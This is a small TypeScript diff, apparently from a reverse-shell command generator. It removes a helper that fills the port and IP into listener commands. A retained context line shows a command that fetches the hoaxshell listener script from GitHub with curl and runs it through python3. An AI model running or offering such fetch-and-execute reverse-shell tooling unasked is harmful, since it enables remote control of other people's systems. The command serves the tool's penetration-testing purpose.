@@ -41,13 +41,3 @@ export const LISTENER_COMMANDS = [
       'python3 -c "$(curl -s https://raw.githubusercontent.com/t3l3machus/hoaxshell/main/revshells/hoaxshell-listener.py)" -t {type} -p {port}'
   }
 ]
-
-export const getListenerCommand = (type: string, port: string, ip?: string) => {
-  const command = LISTENER_COMMANDS.find((item) => item.key === type)?.value
-
-  if (!command) {
-    return ''
-  }
-
-  return command.replace('{port}', port).replace('{ip}', ip || '')
-}
